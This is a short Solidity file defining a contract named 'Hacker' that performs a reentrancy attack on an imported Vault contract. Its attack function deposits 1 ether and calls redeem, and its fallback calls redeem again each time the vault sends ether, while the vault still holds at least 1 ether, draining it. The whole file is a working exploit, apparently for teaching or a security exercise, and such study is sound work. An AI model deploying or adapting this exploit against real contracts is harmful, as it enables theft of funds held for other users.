// SPDX-License-Identifier: GPL-3.0

pragma solidity 0.8.18;

import './Vault.sol';
 
contract Hacker {
    Vault public vault;
 
    constructor(address _vaultAddress) {
        vault = Vault(_vaultAddress);
    }

 
    function attack() external payable {
        require(msg.value >= 1 ether);
        vault.store{value: 1 ether}();   
        vault.redeem();
    }
      
    // Fallback is called when Vault sends Ether to this contract.
    fallback() external payable {
        if (address(vault).balance >= 1 ether) {
            vault.redeem();
        }
    }
}